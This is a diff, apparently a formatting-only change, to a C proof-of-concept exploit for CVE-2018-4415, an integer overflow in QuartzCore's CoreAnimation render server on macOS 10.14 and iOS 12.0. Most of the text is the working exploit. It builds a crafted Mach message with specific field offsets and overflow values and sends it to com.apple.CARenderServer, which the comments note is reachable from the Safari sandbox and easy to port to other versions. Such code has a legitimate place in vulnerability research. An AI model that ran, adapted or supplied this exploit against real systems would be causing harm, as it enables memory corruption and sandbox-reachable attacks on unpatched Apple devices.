@@ -1,30 +1,27 @@
 /**
  *  Brief: Integer overflow in CoreAnimation, CVE-2018-4415
  *  Usage:
- *    1. clang FunctionIntOverFlow.c -o function_over_flow 
+ *    1. clang FunctionIntOverFlow.c -o function_over_flow
  *    2. ./function_over_flow
  *
  *  Specifically, `CA::Render::InterpolatedFunction::allocate_storage` function in QuartzCore does
  *  not do any check for integer overflow in expression |result = (char *)malloc(4 * (v4 + v3));|.
  *
- *  The bug has been fixed in macOS 10.14.1 and iOS 12.1, since the interfaces and structure of 
- *  messages are inconsistent between different versions, this PoC may only work on macOS 10.14 and 
+ *  The bug has been fixed in macOS 10.14.1 and iOS 12.1, since the interfaces and structure of
+ *  messages are inconsistent between different versions, this PoC may only work on macOS 10.14 and
  *  iOS 12.0, but it's very easy to replant it to another versions.
  *
- *  Tips for debugging on macOS: Turn Mac to sleep mode and ssh to the target machine, this may 
+ *  Tips for debugging on macOS: Turn Mac to sleep mode and ssh to the target machine, this may
  *  help you concentrate on your work.
  *
- *  One more: Mach service com.apple.CARenderServer is reacheable from Safari sandbox on both macOS 
+ *  One more: Mach service com.apple.CARenderServer is reacheable from Safari sandbox on both macOS
  *  and iOS. com.apple.windowserver.active accurately on macOS versions prior to macOS 10.14.
  */
 
-
-
-#include <mach/mach.h>
 #include <dlfcn.h>
+#include <mach/mach.h>
 #include <stdio.h>
 #include <unistd.h>
-
 
 static void do_int_overflow() {
 
@@ -82,11 +79,11 @@ static void do_int_overflow() {
     mach_port_t context_port = *(uint32_t *)((uint8_t *)&msg_register + 0x1c);
     uint32_t conn_id = *(uint32_t *)((uint8_t *)&msg_register + 0x30);
 
-	typedef struct quartz_function_int_overflow_s quartz_function_int_overflow_t;
-	struct quartz_function_int_overflow_s {
-		mach_msg_header_t header;
-		char msg_body[0x60];
-	};
+    typedef struct quartz_function_int_overflow_s quartz_function_int_overflow_t;
+    struct quartz_function_int_overflow_s {
+        mach_msg_header_t header;
+        char msg_body[0x60];
+    };
 
     quartz_function_int_overflow_t function_int_overflow_msg = {0};
     function_int_overflow_msg.header.msgh_bits =
@@ -95,7 +92,7 @@ static void do_int_overflow() {
     function_int_overflow_msg.header.msgh_id = 40002;
 
     memset(function_int_overflow_msg.msg_body, 0x0, sizeof(function_int_overflow_msg.msg_body));
-    *(uint32_t*)(function_int_overflow_msg.msg_body + 0) = 0x1;  // Ports count
+    *(uint32_t *)(function_int_overflow_msg.msg_body + 0) = 0x1;  // Ports count
 
     /**
      *	1. One port consumes 12B space
@@ -103,23 +100,22 @@ static void do_int_overflow() {
      *	   cleared by memset)
      */
 
-    *(uint32_t*)(function_int_overflow_msg.msg_body + 4 + 12 + 0) = 0xdeadbeef;
-    *(uint32_t*)(function_int_overflow_msg.msg_body + 4 + 12 + 4) = conn_id;
-    *(int8_t*)(function_int_overflow_msg.msg_body + 4 + 12 + 16) = 2;
-    *(uint64_t*)(function_int_overflow_msg.msg_body + 4 + 12 + 16 + 1) = 0xdeadbeefdeadbeef;
-    *(uint32_t*)(function_int_overflow_msg.msg_body + 4 + 12 + 16 + 9) = 0xffffffff;
+    *(uint32_t *)(function_int_overflow_msg.msg_body + 4 + 12 + 0) = 0xdeadbeef;
+    *(uint32_t *)(function_int_overflow_msg.msg_body + 4 + 12 + 4) = conn_id;
+    *(int8_t *)(function_int_overflow_msg.msg_body + 4 + 12 + 16) = 2;
+    *(uint64_t *)(function_int_overflow_msg.msg_body + 4 + 12 + 16 + 1) = 0xdeadbeefdeadbeef;
+    *(uint32_t *)(function_int_overflow_msg.msg_body + 4 + 12 + 16 + 9) = 0xffffffff;
 
-    *(uint8_t*)(function_int_overflow_msg.msg_body + 4 + 12 + 16 + 13) = 0x12;  // Decode Function
-    *(uint8_t*)(function_int_overflow_msg.msg_body + 4 + 12 + 16 + 14) = 0x2;
+    *(uint8_t *)(function_int_overflow_msg.msg_body + 4 + 12 + 16 + 13) = 0x12;  // Decode Function
+    *(uint8_t *)(function_int_overflow_msg.msg_body + 4 + 12 + 16 + 14) = 0x2;
     /**(uint32_t*)(function_int_overflow_msg.msg_body + 4 + 12 + 16 + 15) = 0xDECAFBAD;*/
-    *(uint64_t*)(function_int_overflow_msg.msg_body + 4 + 12 + 16 + 15) = 0x2000000000000000;
-    *(uint32_t*)(function_int_overflow_msg.msg_body + 4 + 12 + 16 + 23) = 1;
-    *(uint32_t*)(function_int_overflow_msg.msg_body + 4 + 12 + 16 + 27) = 2;
-    *(uint8_t*)(function_int_overflow_msg.msg_body + 4 + 12 + 16 + 31) = 1;
+    *(uint64_t *)(function_int_overflow_msg.msg_body + 4 + 12 + 16 + 15) = 0x2000000000000000;
+    *(uint32_t *)(function_int_overflow_msg.msg_body + 4 + 12 + 16 + 23) = 1;
+    *(uint32_t *)(function_int_overflow_msg.msg_body + 4 + 12 + 16 + 27) = 2;
+    *(uint8_t *)(function_int_overflow_msg.msg_body + 4 + 12 + 16 + 31) = 1;
 
-    kr =
-        mach_msg(&function_int_overflow_msg.header, MACH_SEND_MSG,
-                 sizeof(function_int_overflow_msg), 0, 0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
+    kr = mach_msg(&function_int_overflow_msg.header, MACH_SEND_MSG,
+                  sizeof(function_int_overflow_msg), 0, 0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
     if (kr != KERN_SUCCESS) {
         printf("[-] Send message failed: %s\n", mach_error_string(kr));
         return;
@@ -127,7 +123,6 @@ static void do_int_overflow() {
 
     return;
 }
-
 
 int main() {
     do_int_overflow();
